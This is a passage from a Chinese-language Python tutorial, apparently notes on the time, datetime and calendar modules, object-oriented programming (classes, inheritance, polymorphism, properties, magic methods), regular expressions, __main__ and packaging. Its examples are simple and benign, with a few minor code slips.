fileName)getAllDirQU(r&quot;d:\\py_work&quot;) 2，时间模块1,time模块时间的表示形式： 1，时间戳 以整数或浮点型表示时间的一个以秒为单位的时间间隔，这个时间间隔的基础值是从1970年1月1日0点开始算起 2，元组 一种python的数据结构表示，这个元组有9个整数内容 12345678910属性 值tm_year（年） 比如2011 tm_mon（月） 1 - 12tm_mday（日） 1 - 31tm_hour（时） 0 - 23tm_min（分） 0 - 59tm_sec（秒） 0 - 61tm_wday（weekday） 0 - 6（0表示周日）tm_yday（一年中的第几天） 1 - 366tm_isdst（是否是夏令时） 默认为-1 3,时间字符串格式结构 format time结构化表示 格式 含义 %a 本地（locale）简化星期名称 %A 本地完整星期名称 %b 本地简化月份名称 %B 本地完整月份名称 %c 本地相应的日期和时间表示 %d 一个月中的第几天（01 - 31） %H 一天中的第几个小时（24小时制，00 - 23） %I 第几个小时（12小时制，01 - 12） %j 一年中的第几天（001 - 366） %m 月份（01 - 12） %M 分钟数（00 - 59） %p 本地am或者pm的相应符 %S 秒（01 - 61） %U 一年中的星期数。（00 - 53星期天是一个星期的开始。）第一个星期天之前的所有天数都放在第0周。 %w 一个星期中的第几天（0 - 6，0是星期天） %W 和%U基本相同，不同的是%W以星期一为一个星期的开始。 %x 本地相应日期 %X 本地相应时间 %y 去掉世纪的年份（00 - 99） %Y 完整的年份 %Z 时区的名字（如果不存在为空字符） %% ‘%’字符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import time#返回当前时间的时间戳，浮点数形式，不需要参数c = time.time()print(c)#将时间戳转为UTC时间元组t = time.gmtime(c)print(t)#将时间戳转为本地时间元组b = time.localtime(c)print(b)#将本地时间元组转成时间戳m = time.mktime(b)print(m)#将时间元组转成字符串s = time.asctime(b)print(s)#将时间戳转为字符串p = time.ctime(c)print(p)#将时间元组转换成指定格式的字符串，参数2为时间元组，如果没有参数2，默认转当前时间q = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, b)print(q)print(type(q))#将时间字符串转为时间元组w = time.strptime(q, &quot;%Y-%m-%d %X&quot;)print(w)#延迟一个时间，整型或浮点型#time.sleep(4)#返回当前程序的cpu执行时间，Unix 始终返回全部的运行时间，windows从第二次开始，都是以第一个调用此函数#开始的时间戳作为基数y1 = time.clock() #python3.8已经弃用了。使用time.perf_counter()y1 = time.perf_counter()print(y1)#测试cpu处理这个程序需要多少时间，可以测试性能。time.perf_counter()sum = 0for i in range(100000000): sum +=iprint(time.perf_counter()) 常见结构化的时间组合： 12print(time.strftime(&quot;%Y-%m-%d %X&quot;))#2020-05-11 06:15:53 time加减 1234567import time#timestamp加减单位以秒为单位t1 = time.time()t2 =t1 + 10print(time.ctime(t1)) #Mon May 11 06:19:04 2020print(time.ctime(t2)) #Mon May 11 06:19:14 2020 2.datetime日期时间模块123456789101112131415161718192021222324252627282930313233343536373839404142import datetime'''datetime比time高级了不少，可以理解为datetime基于time进行了封装，提供了各种使用的函数，datetime模块的接口更直观，更容易调用。模块中的类：datetime 同时有时间和日期timedelta 主要用于计算时间的跨度tzinfo 时区相关 time 只关注时间date 只关注日期'''d1 = datetime.datetime.now()print(d1)print(type(d1))#获取指定时间d2 = datetime.datetime(1999,10,1, 10, 28, 25,123456)print(d2)#将时间转为字符串d3 = d1.strftime(&quot;%Y-%m-%d %X&quot;)print(d3)print(type(d3))#将格式化字符串转为datetime对象#注意：转换的格式要与字符串一致d4 = datetime.datetime.strptime(d3, &quot;%Y-%m-%d %X&quot; )print(d4)#做减法d5 = datetime.datetime(1999,10,1, 10, 28, 25,123456)d6 = datetime.datetime.now()d7 = d6 - d5print(d7)print(type(d7))#间隔的天数print(d7.days)#间隔天数除外的秒数print(d7.seconds) 3，calendar日历模块123456789101112131415import calendar#使用#输出指定年月份的日历print(calendar.month(2019,8 ))#返回指定年的日历print(calendar.calendar(2019))#可以判断闰年返回True,否则返回Falseprint(calendar.isleap(2000))#返回某个月的周第一天，和总天数print(calendar.monthrange(2019, 8))#返回某个月以每一周为元素的列表print(calendar.monthcalendar(2019,8)) 3,面向对象编程面向对象思想，指挥别人做事， 是一种符合人们思考习惯的思想 可以将复杂的事情简单化 将程序员从执行者转换成了指挥者 完成需求时： ​ 先要去找具有所需的功能的对象来用 ​ 如果该对象不存在，那么创建一个具有所需功能的对象。 1，类我们先前看过两种编程模式 - 命令式（使用语句，循环和函数）和 函数式（使用纯函数，高阶函数和递归）。 另一个非常流行的范例是面向对象编程（OOP）。 对象是使用类来创建的，而这些类实际上是 OOP 的模具。 这个类（图纸设计）描述了这个对象是什么，但是和对象本身是分开的。换句话说，一个类可以被描述为一个对象的蓝图，描述或定义。 您可以使用相同的类作为创建多个不同对象的蓝图。 类的设计 只关心3样东西 ​ 事物名称(类名)：人（person) ​ 属性： 身高(height)、年龄(age) ​ 行为(功能): 跑(run)、打架(fight) 类是使用关键字 class 和一个包含类方法的缩进块创建的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576'''设计类类名：见名知意、首字母大写，其他遵守驼峰原则属性： 见名知意、其他遵守驼峰原则行为(方法/功能:)见名知意，其他遵循驼峰原则''''''创建类:类：一种数据类型，本身并不占有内存空间，根据所学过的number,string,booleam等类似。用类创建实例话对象(变量).对象占用内存空间格式：class 类名(父类列表): 属性 行为 '''# object:基类，超类，所有类的父类，一般没有合适的父类就写objectclass Person(object): #定义属性(定义变量) name = &quot;&quot; age = 0 height = 0 weight = 0 #定义方法(定义函数) #注意：方法的参数必须以self当第一个参数 #self代表类的实例(某个对象) def run(self): print(&quot;run&quot;) def eat(self,food): print(&quot;eat &quot; + food) def openDoor(self): print(&quot;我已经打开了冰箱门&quot;) def filleEle(self): print(&quot;我已经把大象装进冰箱了&quot;) def closeDoor(self): print(&quot;我已经关闭了冰箱门&quot;) '''实例化对象格式： 对象名 = 类名(参数列表) 对象名就是相当于变量名注意： 没有参数，小括号也不能省略 '''per1 = Person()print(per1)print(type(per1))print(id(per1))#都是同个类型，但不是同个人，不是同个对象。世上没有一模一样的对象。per2 = Person()print(per2)print(type(per2))print(id(per2))'''访问属性格式：对象名.属性名赋值： 对象名.属性名 = 新值'''per1.name = &quot;tom&quot;per1.age = 18per1.height = 160per1.weight = 80print(per1.name, per1.age , per1.height, per1.weight)'''访问方法(功能)格式： 对象名.方法名(参数列表)'''#让这个对象去做动作，干活。per1.openDoor()per1.filleEle()per1.closeDoor()per1.eat(&quot;apple&quot;) 下面是一个简单的类和它的对象的例子。 12345678910111213141516class Cat: def __init__(self, color, legs): self.color = color self.legs = legsfelix = Cat(&quot;ginger&quot;, 4)rover = Cat(&quot;dog-colored&quot;, 4)stumpy = Cat(&quot;brown&quot;, 3)print(&quot;felix:&quot;,felix.__dict__) #dict是用来存储对象属性的一个字典，其键为属性名，值为属性的值.print(&quot;rover:&quot;,rover.__dict__)print(&quot;stumpy:&quot;,stumpy.__dict__)结果：felix: {'color': 'ginger', 'legs': 4}rover: {'color': 'dog-colored', 'legs': 4}stumpy: {'color': 'brown', 'legs': 3} 这段代码定义了一个名为 Cat 的类，它有两个属性：color 和 legs。然后这个类被用来创建这个类的3个独立的对象. __init__ __init__ 方法是一个类中最重要的方法。 这是在创建类的实例（对象）时使用类名称作为函数调用的。 所有的方法都必须以 self 作为自己的第一个参数，虽然它没有被明确地传递，但是 Python 为自己添加了自变量; 在调用方法时，不需要包含它。在一个方法定义中，self 指的是调用该方法的实例。self代表类的实例，也就是当前的对象。而非类， 123哪个对象调用方法，那么该方法中的self就代表哪个对象 self中文是自己的意思,self不是关键字。换成其他的标示符也可以，但是一般都是用selfself.__class__ 代表类名 注意: __init__ 是两个下划线, 不是一个下划线 _init_ 类的实例具有属性，这些属性是与它们相关联的数据片段。 在这个例子中，Cat 实例具有属性 color 和 legs。这些可以通过在一个实例之后加一个点和属性名来访问。 在__init__ 方法中，可以使用 self.attribute 来设置实例属性的初始值。 例如： 12345678910111213class Cat: def __init__(self, color, legs): self.color = color self.legs = legsfelix = Cat(&quot;ginger&quot;, 4)print(felix.color)print(felix.legs)结果：ginger4在上面的例子中，__init__ 方法接受两个参数并将它们分配给对象的属性。__init__ 方法被称为类构造函数。 构造函数 1234567891011121314151617181920212223242526272829303132# object:基类，超类，所有类的父类，一般没有合适的父类就写objectclass Person(object): #定义属性(定义变量) name = &quot;&quot; age = 0 height = 0 weight = 0 #定义方法(定义函数) #注意：方法的参数必须以self当第一个参数 #self代表类的实例(某个对象) def run(self): print(&quot;run&quot;) def eat(self,food): print(&quot;eat &quot; + food) def __init__(self,name, age, height, weight): #print(name, age, height, weight) #定义属性 self.name = name self.age = age self.height = height self.weight = weight pass'''构造函数： __init__() 在使用类创建对象的时候自动调用注意：如果不显示的写出构造函数，默认自动添加一个空的构造函数'''per = Person(&quot;hanmeimei&quot;, 20, 170, 55)print(per.name, per.age)per2 = Person(&quot;lilei&quot;, 21 ,175, 75)print(per2.name,per2.age) 重写 123456789101112131415161718192021222324252627'''重写：将函数重写定义写一遍__str__():在调用print打印对象时自动调用，是给用户用的，是一个描述对象的方法__repr__():是给机器用的，在Python解释器里面直接敲对象名在回车后调用的方法注意： 在没有__str__时，且有__repr__, __str__=__repr__优点：当一个对象的属性值比较多，并且都需要打印，重写了__str__方法后，简化了代码'''class Person(object): def __init__(self,name, age, height,weight): self.name = name self.age = age self.height = height self.weight = weight def __str__(self): return &quot;%s-%d-%d-%d&quot; % (self.name,self.age,self.height, self.weight)per = Person(&quot;hanmeimei&quot;, 20, 170, 55)print(per)输出：hanmeimei-20-170-55 访问限制 123456789101112131415161718192021222324252627282930313233343536373839404142434445'''访问限制'''class Person(object): def run(self): print(self.__money) print(&quot;run&quot;) def eat(self,food): print(&quot;eat &quot; + food) def __init__(self,name, age, height,weight,money): self.name = name self.age = age self.height = height self.weight = weight self.__money = money #_Person__money # 通过内部的方法，去修改私有属性 def setMoney(self,money): if money &lt; 0: money = 0 self.__money = money def getMoney(self): return self.__moneyper = Person(&quot;hanmeimei&quot;, 20, 170, 55,1000)#per.age = 10#print(per.age)#如果要让内部的属性不被外部直接访问,在属性签加两个下划线(__),在python中，如果在属性前加两个下划线，那么这个属性就变成了私有属性。#per.__money = 0#print(per.__money) #外部使用，会报错#per.run() #内部可以调用per.setMoney(23) #通过内部方法，修改值为23print(per.getMoney结果：输出23,#不能直接访问per.__money是因为python解释器把__money变成了_Person__moeny,但是强烈建议不要这么干，不同的解释器可能存在解释的变量不一致，per._Person__money = 1 这样修改值就变成1print(per.getMoney()) 2,继承继承提供了一种在类之间共享功能的方法。 想象几个类，Cat，Dog，Rabbit等。虽然它们在某些方面可能有所不同（只有 Dog 可能有 bark 方法），但它们可能在其他方面相似（都具有 color 和 name 的属性）。 这种相似性可以通过使它们全部从包含共享功能的超类 Animal 中继承来表示。 要从另一个类继承一个类，请将超类名放在类名后面的括号中。 例如： 12345678910111213141516171819class Animal: def __init__(self, name, color): self.name = name self.color = colorclass Cat(Animal): def purr(self): print(&quot;Purr...&quot;) class Dog(Animal): def bark(self): print(&quot;Woof!&quot;)fido = Dog(&quot;Fido&quot;, &quot;brown&quot;)print(fido.color)fido.bark()结果：brownwoof! 从另一个类继承的类称为子类。 被继承的类被称为超类。 如果一个类继承了另一个具有相同属性或方法的类，它的属性和方法将覆盖它们。 123456789101112131415161718class Wolf: def __init__(self, name, color): self.name = name self.color = color def bark(self): print(&quot;Grr...&quot;)class Dog(Wolf): def bark(self): print(&quot;Woof&quot;) husky = Dog(&quot;Max&quot;, &quot;grey&quot;)husky.bark()结果：woof在上面的例子中，Wolf 是超类，Dog 是子类。 继承也可以是间接的。一个类B继承类A，而类C也可以继承类B。 12345678910111213141516171819202122class A: def method(self): print(&quot;A method&quot;) class B(A): def another_method(self): print(&quot;B method&quot;) class C(B): def third_method(self): print(&quot;C method&quot;) c = C()c.method()c.another_method()c.third_method()结果：A methodB methodC method但是，不允许循环继承。 super 函数是一个与父类继承相关的函数。它可以用来在对象的超类中找到具有特定名称的方法。 例如： 1234567891011121314class A: def spam(self): print(1)class B(A): def spam(self): print(2) super().spam() B().spam()结果：21super().spam() 是调用超类的 spam 方法。 1234567891011121314151617181920212223242526272829class Person(object): def __init__(self, name, age): self.name = name self.age = age def run(self): print(&quot;run&quot;) def eat(self, food): print(&quot;eat &quot; + food)class Student(Person): def __init__(self, name,age,stuId): #调用父类中的__init__ super(Student, self).__init__(name, age) #子类可以有一些自己独有的属性 self.stuId = stuIdclass Worker(Person): def __init__(self, name,age): #调用父类中的__init__, (worker,self)可以不用写 super(Worker, self).__init__(name, age)stu = Student(&quot;tom&quot; ,18 ,2)print(stu.name,stu.age,stu.stuId )wor = Worker(&quot;lilei&quot;, &quot;20&quot;)print(wor.name, wor.age )wor.eat(&quot;apple&quot;) 多继承 12345678910111213141516171819202122232425262728293031323334class Father(object): def __init__(self, money): self.money = money def play(self): print(&quot;play&quot;) def func (self): print(&quot;func1&quot;)class Mother(object): def __init__(self, faveValue): self.faceValue = faveValue def eat(self): print(&quot;eat&quot;) def func(self): print(func2)#Father在前面class Child(Father,Mother): def __init__(self,money, faceValue): #多继承的写法 Father.__init__(self, money) Mother.__init__(self, faceValue)#多继承的实现def main(): c = Child(300, 100) print(c.money, c.faceValue) c.play() c.eat() #注意：父类中方法名相同，默认调用的是在括号中排前面的父类中的方法 c.func()if __name__ == &quot;__main__&quot;: main() 多态 123多态：一种事物的多种形态最终目标：人可以喂任何一种动物 创建类人person.py 12345678910111213#人class Person(object): ''' def feedCat(self, cat): print(&quot;给你食物&quot;) cat.eat() def feedMouse(self, mouse): print(&quot;给你食物&quot;) mouse.eat() ''' def feedAnimal(self,ani): print(&quot;给你食物&quot;) ani.eat() 创建类动物 animal.py 123456#动物class Animal(object): def __init__(self, name): self.name = name def eat(self): print(self.name + &quot;吃&quot;) 创建类猫,老鼠cat.py ,mouse.py 123456789101112131415#猫from animal import Animalclass Cat(Animal): def __init__(self, name): #self.name = name super(Cat, self).__init__(name)#老鼠from animal import Animalclass Mouse(Animal): def __init__(self, name): #self.name = name super(Mouse, self).__init__(name) 执行 1234567891011121314151617181920212223242526272829303132from cat import Catfrom mouse import Mousefrom person import Person'''多态：一种事物的多种形态最终目标：人可以喂任何一种动物'''tom = Cat(&quot;tom&quot;)jerry = Mouse(&quot;jerry&quot;)tom.eat()jerry.eat()'''思考：在添加100种动物，也都有name属性和eat方法定义了一个有name属性和eat方法的Animal类， 让所有的动物类都继承自Animal'''#定义一个人类，可以喂猫和老鼠吃东西per = Person()#per.feedCat(tom)#per.feedMouse(jerry)#思考：人要喂100种动物，难道要写100个feed方法吗？？#tom和jerry都继承自动物per.feedAnimal(tom)per.feedAnimal(jerry) 动态添加属性 12345678910111213141516171819202122232425from types import MethodType#创建一个空类class Person(object): __slots__ = (&quot;name&quot;, &quot;age&quot;, &quot;speak&quot;)per = Person()#动态添加属性，这体现了动态语言的特点(灵活)per.name = &quot;tom&quot;print(per.name)#动态添加方法def say(self): print(&quot;my name is &quot; + self.name)per.speak = MethodType(say, per)per.speak()#思考：如果我们想要限制实例的属性怎么办？#比如，只允许给对象添加name,age,height,weight属性#解决：定义类的时候，定义一个特殊的属性( )，可以限制动态添加的属性per.height = 170#print(per.height)print() @property可以让你对受限制的访问的属性使用点.语法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Person(object): def __init__(self,age, name): #属性直接对外暴露 #self.age = age #限制访问 self.__age = age self.__name = name''' def getAge(self): return self.__age def setAge(self, age): if age &lt; 0: age = 0 self.__age = age'''@propertydef age(self): return self.__age@age.setter #去掉下划线.setterdef age(self , age): if age &lt; 0: age = 0 self.__age = age@propertydef name(self): return self.__name@name.setter #去掉下划线.setterdef name(self , name): self.__name = nameper = Person(18,&quot;tom&quot;)#print(per.age)#属性直接对外暴露#不安全，没有数据的过滤#per.age = -10#print(per.age)#使用限制访问，需要自己写set和get方法才能访问#per.setAge(15)#print(per.getAge())per.age = 100 #相当于调用setAgeprint(per.age) #相当于调用getAgeper.name = (&quot;tom&quot;)print(per.name) 3,魔术方法和操作符重载魔术方法是在名称的开始和结尾都有双下划线的特殊方法。 到目前为止，我们唯一遇到的是 __init__，但还有其他几个。 它们被用来创建不能用普通方法表示的功能。 它们的一个常见用途是运算符重载。 这意味着为自定义类定义运算符，允许使用 + 和 * 等运算符。 例子中魔术方法是 __add__ 重载 +。 12345678910111213141516171819class Vector2D: def __init__(self, x, y): self.x = x self.y = y def __add__(self, other): return Vector2D(self.x + other.x, self.y + other.y)first = Vector2D(5, 7)second = Vector2D(3, 9)result = first + secondprint(result.x)print(result.y)结果：816__add__ 方法允许为我们的类中的 + 运算符定义自定义行为。正如你所看到的，它添加了对象的相应属性并返回一个包含结果的新对象。一旦定义了，我们就可以将这个类的两个对象相加。 魔术方法 12345678910111213141516171819202122232425262728293031323334常见的魔术方法： __sub__ 对应 -__mul__ 对应 *__truediv__ 对应 /__floordiv__ 对应 //__mod__ 对应 %__pow__ 对应 **__and__ 对应 &amp;__xor__ 对应 ^__or__ 对应 |表达式 x + y 被翻译成 x.__add__(y)。然而，如果 x 没有实现 __add__，并且 x 和 y 的类型不同，则调用 y.__radd__(x)。对于刚刚提到的所有魔法方法，都有等价的方法。class SpecialString: def __init__(self, cont): self.cont = cont def __truediv__(self, other): line = &quot;=&quot; * len(other.cont) return &quot;\\n&quot;.join([self.cont, line, other.cont])spam = SpecialString(&quot;spam&quot;)hello = SpecialString(&quot;Hello world!&quot;)print(spam / hello)结果：spam============Hello world!在上面的例子中，我们为我们的类 SpecialString 定义了除法操作。 1234567891011121314151617181920212223242526272829303132333435Python 也为比较运算提供了魔术方法。__lt__ 对应 &lt;__le__ 对应 &lt;=__eq__ 对应 ==__ne__ 对应 !=__gt__ 对应 &gt;__ge__ 对应 &gt;=如果 __ne__ 没有被实现，它将返回 __eq__ 相反的结果。其他比较运算符之间没有其他关系。例如：class SpecialString: def __init__(self, cont): self.cont = cont def __gt__(self, other): for index in range(len(other.cont)+1): result = other.cont[:index] + &quot;&gt;&quot; + self.cont result += &quot;&gt;&quot; + other.cont[index:] print(result)spam = SpecialString(&quot;spam&quot;)eggs = SpecialString(&quot;eggs&quot;)spam &gt; eggs结果：&gt;spam&gt;eggse&gt;spam&gt;ggseg&gt;spam&gt;gsegg&gt;spam&gt;seggs&gt;spam&gt;如您所见，您可以为重载操作符定义任何自定义行为 12345678910有几个神奇的方法使类像容器一样行事。__len__ 对应 len()__getitem__ 对应 获取索引__setitem__ 对应 分配索引值__delitem__ 对应 删除索引值__iter__ 对应 迭代对象（例如for循环）__contains__ 对应 in还有很多其他的魔术方法，我们不会在这里介绍，比如将 __call__ 作为函数调用对象，__int__，__str__ 等等，将对象转换为内建类型。 4,正则表达式1，介绍 Python 中的正则表达式可以使用 re 模块来访问，它是标准库的一部分。 定义正则表达式之后，可以使用 re.match 函数来确定字符串的开头是否匹配。 如果匹配，match 返回表示匹配的对象，否则返回 None。 为了避免在处理正则表达式时出现混淆，我们使用原始字符串 **r”expression”**。 原始字符串不会转义任何东西，这使得使用正则表达式更容易。 1234567891011import repattern = r&quot;spam&quot;if re.match(pattern, &quot;spamspamspam&quot;): print(&quot;Match&quot;)else: print(&quot;No match&quot;) 结果： match 上面的例子检查字符串是否匹配 &quot;spam&quot;，如果是，则打印 &quot;Match&quot;。 其他的正则函数是 re.search 和 re.findall。 re.search 函数在字符串中的任何位置找到匹配的模式。 re.findall 函数返回一个与模式匹配的所有子串的列表。 例如： 123456789101112131415161718192021222324import repattern = r&quot;spam&quot;if re.match(pattern, &quot;eggspamsausagespam&quot;): print(&quot;Match&quot;)else: print(&quot;No match&quot;)if re.search(pattern, &quot;eggspamsausagespam&quot;): print(&quot;Match&quot;)else: print(&quot;No match&quot;) print(re.findall(pattern, &quot;eggspamsausagespam&quot;))结果：No matchMatch['spam', 'spam']在上面的示例中，匹配函数与模式不匹配，因为它从字符串的开头开始匹配。search 函数找到了匹配的字符串。函数 re.finditer 和 re.findall 类似，不过它返回一个迭代器，而不是一个列表。 正则表达式搜索使用多个方法返回一个对象，提供有关它的详细信息。 这些方法包括返回匹配的字符串的组，返回第一个匹配的开始和结束位置的开始和结束，以及将第一个匹配的开始和结束位置作为元组返回的跨度。 例如： 123456789101112131415import repattern = r&quot;pam&quot;match = re.search(pattern, &quot;eggspamsausage&quot;)if match: print(match.group()) print(match.start()) print(match.end()) print(match.span()) 结果：pam47(4, 7) 使用正则表达式的最重要的 re 方法是 sub。 语法： re.sub(pattern, repl, string, max=0) 此方法用 repl 替换字符串中所有出现的模式，除非提供 max限定修改数量。 sub 方法返回修改后的字符串。 例如： 12345678import restr = &quot;My name is Loen. Hi Loen.&quot;pattern = r&quot;Loen&quot;newstr = re.sub(pattern, &quot;Amy&quot;, str) #str表示上面的变量print(newstr)结果：My name is Amy. Hi Amy. 2,元字符 我们将看到的第一个元字符是 . （点）。 它匹配任何字符，但不匹配新的行。 123456789101112131415import repattern = r&quot;gr.y&quot;if re.match(pattern, &quot;grey&quot;): print(&quot;Match 1&quot;)if re.match(pattern, &quot;gray&quot;): print(&quot;Match 2&quot;)if re.match(pattern, &quot;blue&quot;): print(&quot;Match 3&quot;) 结果：Match 1Match 2 接下来的两个元字符是 ^ 和 $ 。 这两个分别匹配字符串的开始和结束。 例如： 123456789101112131415import repattern = r&quot;^gr.y$&quot;if re.match(pattern, &quot;grey&quot;): print(&quot;Match 1&quot;)if re.match(pattern, &quot;gray&quot;): print(&quot;Match 2&quot;)if re.match(pattern, &quot;stingray&quot;): print(&quot;Match 3&quot;) 结果：Match 1Match 2 模式 “^gr.y$” 表示字符串应该以gr开头，然后跟随一个任何字符，除了换行符，并以y结尾。 3，字符类 字符类提供了一种只匹配特定字符集中的一个的方法。 通过将匹配的字符放在方括号内来创建字符类。 123456789101112131415import repattern = r&quot;[aeiou]&quot;if re.search(pattern, &quot;grey&quot;): print(&quot;Match 1&quot;)if re.search(pattern, &quot;qwertyuiop&quot;): print(&quot;Match 2&quot;)if re.search(pattern, &quot;rhythm myths&quot;): print(&quot;Match 3&quot;)结果：match 1match 2 搜索函数中的模式 [aeiou] 匹配包含任何一个定义的字符的所有字符串。 字符类也可以匹配字符的范围。 一些例子: [a-z] 匹配任何小写字母字符。 [G-P] 匹配从 G 到 P 的任何大写字符。 [0-9] 匹配任何数字。 一个字符类可以包含多个范围。例如，**[A-Za-z]** 匹配任何一个字母。 例如: 12345678910111213141516import repattern = r&quot;[A-Z][A-Z][0-9]&quot;if re.search(pattern, &quot;LS8&quot;): print(&quot;Match 1&quot;)if re.search(pattern, &quot;E3&quot;): print(&quot;Match 2&quot;)if re.search(pattern, &quot;1ab&quot;): print(&quot;Match 3&quot;) 结果： Match 1上例中的模式匹配包含两个大写字母后跟一个数字的字符串。 在字符类的开头放置一个 ^ 来反转它, 这使得它匹配除包含的字符之外的任何字符。 其他元字符（如 $ 和 .）在字符类中没有意义。 元字符 ^ 没有意义，除非它是一个字符类中的第一个字符。 例如: 12345678910111213141516import repattern = r&quot;[^A-Z]&quot;if re.search(pattern, &quot;this is all quiet&quot;): print(&quot;Match 1&quot;)if re.search(pattern, &quot;AbCdEfG123&quot;): print(&quot;Match 2&quot;)if re.search(pattern, &quot;THISISALLSHOUTING&quot;): print(&quot;Match 3&quot;) 结果： match 1 match 2模式[^A-Z]匹配不包括大写字母的所有字符。 4,更多的元字符 更多的元字符 ***，+，？，{** 和 } 。 这些指定了重复次数。 元字符 * 表示 “零次或者多次重复以前的事情”。它匹配尽可能多的重复。* 号前可以是一个单独的字符，一个类，或一组括在括号中的字符。 12345678910111213141516import repattern = r&quot;egg(spam)*&quot;if re.match(pattern, &quot;egg&quot;): print(&quot;Match 1&quot;)if re.match(pattern, &quot;eggspamspamegg&quot;): print(&quot;Match 2&quot;)if re.match(pattern, &quot;spam&quot;): print(&quot;Match 3&quot;) 结果：Match 1Match 2上面的例子匹配以 &quot;egg&quot; 开头的字符串，并跟随零个或多个 &quot;spam&quot;。 元字符 + 与 * 非常相似，不同之处在于 + 是 “一个或多个重复”，而 * 是“零个或多个重复”。 例如： 123456789101112131415import repattern = r&quot;g+&quot;if re.match(pattern, &quot;g&quot;): print(&quot;Match 1&quot;)if re.match(pattern, &quot;gggggggggggggg&quot;): print(&quot;Match 2&quot;)if re.match(pattern, &quot;abc&quot;): print(&quot;Match 3&quot;) 结果：Match 1Match 2 总结：* 匹配0个或更多的前面的表达式。+ 匹配1个或更多的前面的表达式。 元字符 ? 匹配 “零重复或一次重复”。 例如： 123456789101112131415161718import repattern = r&quot;ice(-)?cream&quot;if re.match(pattern, &quot;ice-cream&quot;): print(&quot;Match 1&quot;)if re.match(pattern, &quot;icecream&quot;): print(&quot;Match 2&quot;)if re.match(pattern, &quot;sausages&quot;): print(&quot;Match 3&quot;)if re.match(pattern, &quot;ice--ice&quot;): print(&quot;Match 4&quot;) 结果： match 1 match 2 大括号可以用来表示两个数字之间的重复次数。 正则表达式 {x，y} 表示 “在x和y之间重复某事”。 因此 {0, 1} 与 ? 相同。 大括号如果第一个数字缺失，则将其视为零。如果第二个数字丢失，则被认为是无限的。 例如： 1234567891011121314151617import repattern = r&quot;9{1,3}$&quot;if re.match(pattern, &quot;9&quot;): print(&quot;Match 1&quot;)if re.match(pattern, &quot;999&quot;): print(&quot;Match 2&quot;)if re.match(pattern, &quot;9999&quot;): print(&quot;Match 3&quot;) 结果：Match 1Match 2&quot;9{1,3}$&quot; 匹配具有1到3个9的字符串。 5，分组 可以通过用圆括号围绕正则表达式的一部分来创建组。 这意味着一个组可以作为元字符的参数，如 * 和？。 1234567891011121314151617import repattern = r&quot;egg(spam)*&quot;if re.match(pattern, &quot;egg&quot;): print(&quot;Match 1&quot;)if re.match(pattern, &quot;eggspamspamspamegg&quot;): print(&quot;Match 2&quot;)if re.match(pattern, &quot;spam&quot;): print(&quot;Match 3&quot;) (spam)代表上面示例模式中的一个组。 结果： match 1 match 2 可以使用组功能访问匹配组中的内容。 可以调用 group(0) 或者 group() 返回整个匹配。 调用 group(n) ,n 要大于 0,返回匹配的第 n 个组。 groups() 返回所有匹配的分组。 例如: 123456789101112131415161718import repattern = r&quot;a(bc)(de)(f(g)h)i&quot;match = re.match(pattern, &quot;abcdefghijklmnop&quot;)if match: print(match.group()) print(match.group(0)) print(match.group(1)) print(match.group(2)) print(match.groups()) 结果：abcdefghiabcdefghibcde('bc', 'de', 'fgh', 'g')从上面的例子可以看出，组可以嵌套。 另一个重要的元字符是 | 。 意思是与，比如 red|blue 匹配 “red”或者”blue”。 例如： 123456789101112131415161718import repattern = r&quot;gr(a|e)y&quot;match = re.match(pattern, &quot;gray&quot;)if match: print (&quot;Match 1&quot;)match = re.match(pattern, &quot;grey&quot;)if match: print (&quot;Match 2&quot;) match = re.match(pattern, &quot;griy&quot;)if match: print (&quot;Match 3&quot;) 结果： match 1 match 2 更有用的特殊序列是 \\d，\\s和 \\w。 这些分别匹配数字，空格和单词字符。 在 ASCII 模式下，它们相当于 [0-9]，[\\t \\n \\r \\f \\v] 和 [a-zA-Z0-9_]。 在 Unicode 模式下，它们也匹配某些其他字符,例如，\\w 匹配带有重音的字母。 大写字母 - \\D，\\S 和 \\W - 这些特殊序列的版本意味着与小写字母相反的版本,例如，\\D 匹配任何不是数字的东西。 123456789101112131415161718import repattern = r&quot;(\\D+\\d)&quot;match = re.match(pattern, &quot;Hi 999!&quot;)if match: print(&quot;Match 1&quot;)match = re.match(pattern, &quot;1, 23, 456!&quot;)if match: print(&quot;Match 2&quot;)match = re.match(pattern, &quot; ! $?&quot;)if match: print(&quot;Match 3&quot;) 结果： Match 1 (\\D+\\d) 匹配一个或多个非数字后跟一个数字。 其他特殊序列是 \\A，\\Z和 \\b。 序列 \\A 和 \\Z 分别匹配字符串的开头和结尾。 序列 \\b 匹配 \\w 和 \\W 字符之间的空字符串，或 \\w 字符和字符串的开始或结尾。非正式地，它代表了单词之间的界限。 序列 \\B 匹配其他地方的空字符串。 例如: 1234567891011121314151617181920import repattern = r&quot;\\b(cat)\\b&quot;match = re.search(pattern, &quot;The cat sat!&quot;)if match: print (&quot;Match 1&quot;)match = re.search(pattern, &quot;We s&gt;cat&lt;tered?&quot;)if match: print (&quot;Match 2&quot;)match = re.search(pattern, &quot;We scattered.&quot;)if match: print (&quot;Match 3&quot;) 结果：match 1 match 2&quot;\\b(cat)\\b&quot; 基本上与单词边界包围的单词 &quot;cat&quot; 匹配。 5,__main__如果我们将前一个示例的代码保存为 w3cschool.py 文件，则可以使用 w3cschool 名称将其作为模块导入到另一个脚本中。 w3cschool.py 12345def function(): print(&quot;This is a module function&quot;)if __name__==&quot;__main__&quot;: print(&quot;This is a script&quot;) some_script.py 12345import w3cschoolw3cschool.function()结果：This is a module function 6，打包在 Python 中，术语打包指的是将模块写成标准格式，以便其他程序员可以轻松安装和使用它们。 为了解决模块命名的冲突，引入了按目录来组织模块的方法称为包， 特点，引入了包以后，只要顶层的包不与其他人发生冲突，那么模块都不会与别人的发生冲突。 这包括使用模块 setuptools 和 distutils。 打包第一步是正确组织现有文件。将所有要放入库的文件放在同一个父目录中。 该目录还应该包含一个名为 __init__.py 的文件，该文件可以是空白的，但必须存在于目录中。 示例目录结构： 12345678910111213141516W3Cschool/ LICENSE.txt README.txt setup.py w3c/ __init__.py w3cschool.py w3cschool2.py您可以根据需要在目录中放置尽可能多的脚本文件__init__.py 文件的作用是什么呢？__init__.py 最明显的作用就是使包和普通目录区分；其次可以在该文件中申明模块级别的import语句从而使其变成包级别可见。导入包格式是：import w3c.w3cschool #w3c代表包名import a.w3cschool #a代表包名 打包的下一步是编写 setup.py 文件。 这包含组装软件包所需的信息，以便将其上传到 PyPI 并使用 pip 